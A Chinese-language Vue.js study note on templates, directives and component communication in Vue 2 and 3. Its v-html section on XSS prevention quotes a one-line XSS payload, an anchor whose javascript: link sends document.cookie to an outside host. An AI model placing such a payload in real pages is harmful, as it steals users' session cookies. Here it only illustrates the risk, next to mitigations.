# Vue

###  创建

想让Vue工作，就必须创建一个Vue实例，且要传入一个配置对象。
被Vue接管的容器中的代码依然符合html规范，只不过混入了一些特殊的Vue语法。
root容器里的代码被称为【Vue模板】
Vue实例和容器是一一对应的
真实开发中只有一个Vue实例，并且会配合着组件一起使用
{{xxx}}中的xxx要写js表达式，且xxx就可以自动读取到data中的所有属性
一旦data中的数据发生改变，那么页面中用到该数据的地方也会自动更新

```html
<!-- 准备一个容器 -->
<div id="root">
    <h1>
        Hell,{{name}}
    </h1>
</div>
<script type="text/javascript">
    Vue.config.productionTip = false // 阻止vue在启动时生成生产提示
    // 创建Vue实例
    new Vue({
        el:'#root', //el用于指定当前Vue实例为哪个容器服务，值通常为css选择器字符串。
        data:{ //data中用于存储数据，数据供el所指定的容器去使用，值现在暂时先写成一个对象，后面换成函数。
            name:'xiaoming'
        }
    })
</script>
```



#### 模板语法

##### 插值

功能：用于解析标签体内容
写法：{{xxx}}，xxx是js表达式，且可以直接读取到data中的所有属性
文本 {{}}

纯HTML

v-html,防止XSS,CSRF(
    1.前端过滤
    2.后台转义`(<> &lt;&gt;)`
    3.给cookie加上属性http
)

```js
<a href=javascript:location.href='http://www.baidu.com?cookie='+document.cookie>click</a>
```

##### 指令

是带有v-前缀的特殊属性
功能：用于解析标签（包括：标签属性，标签内容，绑定事件。。。）
v-bind 动态绑定属性

    缩写：:src

Vue中有两种数据绑定的方式：

- 单向绑定（v-bind）:数据只能从data流向页面。
- 双向绑定（v-model）:数据不仅能从data流向页面，还可以从页面流向data
  - 双向绑定一般都应用在表单类元素上（如input,select）
  - v-model:value可以简写为v-model，因为v-model默认收集的就是value值。

v-if 动态创建/删除

v-show 动态显示/隐藏

v-on:click 绑定事件

    缩写：@click

v-for 遍历

v-model 双向绑定表单

## 组件通信

通信仓库地址：https://gitee.com/jch1011/vue3_communication.git

**props**:可以实现父子组件，子父组件，甚至兄弟组件通信

**自定义事件**:可以实现子父组件通信

**全局事件总线$bus**:可以实现任意组件通信

**pubsub**:发布订阅模式实现任意组件通信

**vuex**:集中式状态管理容器，实现任意组件通信

**ref**:父组件获取子组件实例VC，获取子组件的响应式数据以及方法

**slot**:插槽（默认插槽，具名插槽，作用域插槽）实现父子组件通信.....

### 1.1 props

props可以实现父子组件通信，在vue3中我们可以通过defineProps获取父组件传递的数据。且在组件内部不需要引入defineProps方法可以直接使用！

### 1.2 自定义事件

在vue框架中事件分为两种：一种是原生的DOM事件，另外一种自定义事件。

原生DOM事件可以让用户与网页进行交互，比如click,dbclick,change,moseenter,mouseleave...

自定义事件可以实现子组件给父组件传递数据

#### 1.2.1 原生DOM事件

代码如下:

```html
<pre @click="handler">
	我是祖国的老花朵
</pre>
```

当前代码给pre标签绑定原生DOM事件点击事件，默认回给事件回调主任event事件对象。当点击事件想注入多个参数可以按照下图操作。但是切记注入的事件对象务必叫做$event。

```html
<div @click="handler(1,2,3,$event)">
    我要传递多个参数
</div>
```

在vue3框架click,dbclick,change(这类原生DOM事件)，不管是在标签，自定义标签上（组件标签）都是原生DOM事件。

但在vue2中却不是这样的，在vue2中组件标签需要通过native修饰符才能变为原生DOM事件

#### 1.2.2 自定义事件

### 1.3 全局事件总线

全局事件总线可以实现任意组件通信，在vue2中可以根据VM与VC关系推出全局事件总线。

但是在vue3中没有Vue构造函数，也就没有Vue.prototype.以及组合式API写法没有this,

那么在Vue3想实现全局事件的总线功能就有点不现实啦，如果想在Vue3中使用全局事件总线功能可以使用插件mitt实现。

mitt官网地址：https://www.nmpjs.com/package/mitt

### 1.4 v-model

v-model指令可以是收集表单数据（数据双向绑定），除此之外它也可以实现父子组件数据同步。

而v-model实指利用props[modelValue]与自定义事件[update:modelValue]实现的。

下方代码：相当于给组件Child传递一个props(modelValue)与绑定一个自定义事件update:modelValue实现父子组件数据同步

```html
<Child v-model="msg"></Child>
```

在vue3中一个组件可以通过使用多个v-model,让父组件多个数据同步，下方代码相当于给组件Child传递两个props分别是pageNo与pageSize,以及绑定两个自定义事件update:pageNo与update:pageSize实现父子数据同步

````html
<Child v-model:pageNo="msg" v-model:pageSize="msg1"></Child>
````

